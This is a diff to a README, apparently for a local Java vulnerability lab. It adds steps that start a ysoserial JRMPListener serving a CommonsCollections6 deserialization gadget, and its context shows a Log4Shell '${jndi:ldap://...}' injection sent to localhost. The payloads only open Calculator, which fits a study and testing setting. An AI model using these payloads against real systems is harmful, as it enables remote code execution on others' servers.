@@ -116,6 +116,14 @@ curl 127.0.0.1:8080/log4j -d 'log=${jndi:ldap://127.0.0.1:1389/a}'
 
 #### rmi client
 
+启动RMI服务器
+
+```
+ysoserial ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "open /System/Applications/Calculator.app"
+```
+
+执行客户端查询
+
 ```
 curl 127.0.0.1:8080/registry/lookup -d 'ip=127.0.0.1&port=1099&name=MyService'
 ```
